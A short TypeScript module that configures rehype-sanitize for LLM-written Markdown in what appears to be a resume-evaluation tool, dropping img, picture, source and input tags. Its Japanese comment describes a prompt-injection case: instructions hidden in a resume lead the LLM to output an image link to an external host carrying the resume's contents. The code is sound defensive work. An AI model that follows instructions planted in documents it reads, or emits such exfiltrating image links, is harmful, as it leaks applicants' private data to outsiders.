import { defaultSchema } from 'rehype-sanitize'
import type { Options as SanitizeSchema } from 'rehype-sanitize'

/**
 * LLM が書いた Markdown を描画するときの、許可するタグ（仕様 5.5）。
 *
 * `rehype-sanitize` の既定のスキーマに、下線の `<u>` を足す。さらに、**画像と、フォームの部品を
 * 許可しない**。LLM の出力に、`![x](https://外部/?q=職歴書の内容)` のような画像が含まれると、
 * ブラウザが画像を読み込むときに、職歴書の内容が外部へ送られてしまうため（職歴書の中の指示文に
 * LLM が従った場合などに起こりうる）。評価の文章に、画像は不要。
 */
const BLOCKED_TAGS = new Set(['img', 'picture', 'source', 'input'])

export const sanitizeSchema: SanitizeSchema = {
  ...defaultSchema,
  tagNames: [...(defaultSchema.tagNames ?? []).filter((tag) => !BLOCKED_TAGS.has(tag)), 'u'],
}
